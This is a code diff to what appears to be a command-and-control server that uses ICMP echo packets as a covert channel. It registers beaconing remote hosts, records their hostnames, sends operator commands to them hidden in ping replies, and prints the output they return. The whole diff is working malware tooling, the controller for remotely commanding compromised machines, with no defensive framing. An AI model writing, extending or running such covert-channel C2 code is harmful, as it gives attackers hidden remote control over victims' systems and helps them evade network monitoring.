@@ -91,85 +91,89 @@ void listen_task()
   uint8_t flush = 0x00;
   while (running) {
     std::memset(in, 0, sizeof(in));
-    size_t nbytes = read(sockfd, in, sizeof(in));
 
-    if (nbytes <= 0) continue;
+    size_t nbytes = read(sockfd, in, sizeof(in));
+    if (nbytes < sizeof(iphdr)) continue;
+    nbytes -= sizeof(iphdr);
+
+    if (nbytes < sizeof(icmphdr)) continue;
+    nbytes -= sizeof(icmphdr);
 
     iphdr *ip = (iphdr *)in;
+    icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));
 
-    if (nbytes > sizeof(iphdr)) {
-      nbytes -= sizeof(iphdr);
-      icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));
+    size_t packet_size = sizeof(icmphdr);
+    uint32_t id;
+    size_t index = sizeof(iphdr) + sizeof(icmphdr);
 
-      size_t packet_size = sizeof(icmphdr);
-      uint32_t id;
+    if (nbytes == 0) {
+      std::lock_guard<std::mutex> guard(active_connections_mutex);
+      id = next_connection_id++;
+      active_connections.insert({ id, connection{ inet_ntoa(in_addr{ ip->saddr }) } });
+      std::memcpy(&in[index], &id, sizeof(id));
+      packet_size += sizeof(id);
+      std::cout << "New connection with id=" << id << "\n";
+    } else {
 
-      if (nbytes == sizeof(icmphdr)) {
+      if (nbytes < sizeof(id)) continue;
+      nbytes -= sizeof(id);
+
+      std::memcpy(&id, &in[index], sizeof(id));
+
+      auto &connection = active_connections.at(id);
+      auto &in_buf = connection.in_buf;
+      auto &out_buf = connection.out_buf;
+
+      if (nbytes > 0) {
         std::lock_guard<std::mutex> guard(active_connections_mutex);
-        id = next_connection_id++;
-        active_connections.insert({ id, connection{ inet_ntoa(in_addr{ ip->saddr }) } });
-        std::memcpy(icmp + 1, &id, sizeof(id));
-        packet_size += sizeof(id);
-        std::cout << "New connection with id=" << id << "\n";
-      } else {
-        nbytes -= sizeof(icmphdr);
-        if (nbytes < sizeof(uint32_t)) continue;
+        index += sizeof(id);
 
-        std::memcpy(&id, icmp + 1, sizeof(uint32_t));
-        nbytes -= sizeof(id);
-
-        auto &connection = active_connections.at(id);
-        auto &in_buf = connection.in_buf;
-        auto &out_buf = connection.out_buf;
-
-        if (nbytes > 0) {
-          std::lock_guard<std::mutex> guard(active_connections_mutex);
-          size_t index = sizeof(iphdr) + sizeof(icmphdr) + sizeof(uint32_t);
-          if (in[index] == 'b') {
-            connection.hostname = std::string{ (char *)&in[index + 1], nbytes - 1 };
-          } else {
-            in_buf.data.insert(in_buf.data.end(), &in[index], &in[index + nbytes]);
-          }
-        }
-
-        std::memcpy(&in[sizeof(iphdr) + packet_size], &id, sizeof(id));
-        packet_size += sizeof(id);
-
-        std::memcpy(&in[sizeof(iphdr) + packet_size], &flush, sizeof(flush));
-        packet_size += sizeof(flush);
-
-        if (flush == 0x01) {
-          flush = 0x00;
-        }
-
-        if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
-          std::lock_guard<std::mutex> guard(active_connections_mutex);
-          size_t to_write = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
-          std::memcpy(&in[sizeof(iphdr) + packet_size], out_buf.data.data() + out_buf.pos, to_write);
-          out_buf.pos += to_write;
-          packet_size += to_write;
-          if (out_buf.pos >= out_buf.data.size()) {
-            std::cout << "Flushing data for id=" << id << "\n";
-            out_buf.data.clear();
-            out_buf.pos = 0;
-            out_buf.ready = false;
-            flush = 0x01;
-          }
+        if (in[index] == 0x00 && nbytes != 1) {
+          in_buf.data.insert(in_buf.data.end(), &in[index + 1], &in[index + nbytes]);
+        } else if (in[index] == 0x01) {
+          in_buf.ready = true;
+        } else if (in[index] == 0x02) {
+          connection.hostname = std::string{ (char *)&in[index + 1], nbytes - 1 };
         }
       }
 
-      icmp->type = 0;
-      addr.sin_family = AF_INET;
-      addr.sin_port = htons(0);
-      addr.sin_addr.s_addr = ip->saddr;
+      std::memcpy(&in[sizeof(iphdr) + packet_size], &id, sizeof(id));
+      packet_size += sizeof(id);
 
-      icmp->checksum = 0x00;
-      icmp->checksum = checksum((uint16_t *)icmp, packet_size);
+      std::memcpy(&in[sizeof(iphdr) + packet_size], &flush, sizeof(flush));
+      packet_size += sizeof(flush);
 
-      if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
-        perror("sendto");
-        std::exit(-1);
+      if (flush == 0x01) {
+        flush = 0x00;
       }
+
+      if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
+        std::lock_guard<std::mutex> guard(active_connections_mutex);
+        size_t to_write = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
+        std::memcpy(&in[sizeof(iphdr) + packet_size], out_buf.data.data() + out_buf.pos, to_write);
+        out_buf.pos += to_write;
+        packet_size += to_write;
+        if (out_buf.pos >= out_buf.data.size()) {
+          std::cout << "Flushing data for id=" << id << "\n";
+          out_buf.data.clear();
+          out_buf.pos = 0;
+          out_buf.ready = false;
+          flush = 0x01;
+        }
+      }
+    }
+
+    icmp->type = 0;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(0);
+    addr.sin_addr.s_addr = ip->saddr;
+
+    icmp->checksum = 0x00;
+    icmp->checksum = checksum((uint16_t *)icmp, packet_size);
+
+    if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
+      perror("sendto");
+      std::exit(-1);
     }
   }
 
@@ -186,43 +190,30 @@ void send_command(const std::string &idstr, const std::string &command)
   uint32_t id;
   ss >> id;
 
-  std::lock_guard<std::mutex> guard(active_connections_mutex);
   if (active_connections.find(id) == active_connections.end()) {
     return;
   }
   auto &connection = active_connections.at(id);
 
-  connection.out_buf.data.assign(cmd.begin(), cmd.end());
-  connection.out_buf.ready = true;
+  {
+    std::lock_guard<std::mutex> guard(active_connections_mutex);
+    connection.out_buf.data.assign(cmd.begin(), cmd.end());
+    connection.out_buf.ready = true;
+  }
 
   std::cout << "Sending command:" << command << " to id=" << id << "\n";
 
-  // // listen for response packets
-  // while (1) {
-  //   uint8_t in[512];
+  while (!connection.in_buf.ready) {}
 
-  //   // receive a ping and store the ip addres
-  //   std::string src_ip;
-  //   ssize_t num_bytes = recv_ping(sockfd, src_ip, in, sizeof(in));
+  {
+    std::lock_guard<std::mutex> guard(active_connections_mutex);
+    std::cout << "Received n bytes: " << connection.in_buf.data.size() << "\n";
+    std::string data{ (char *)connection.in_buf.data.data(), connection.in_buf.data.size() };
+    std::cout << data << "\n";
 
-  //   if (dst != src_ip)
-  //     continue;
-
-  //   if (num_bytes > 0) {
-
-  //     char *str_ = (char *)in;
-  //     std::string str(str_, num_bytes);
-
-  //     // only store hostname into active connections list if a beacon is sent
-  //     auto split = split_input(str);
-  //     if (split.at(0).compare("(beacon)") != 0) {
-  //       // put command ouput to stdout
-  //       std::fputs(str.c_str(), stdout);
-  //     }
-  //   } else {
-  //     break;
-  //   }
-  // }
+    connection.in_buf.ready = false;
+    connection.in_buf.data.clear();
+  }
 }
 
 void refresh()
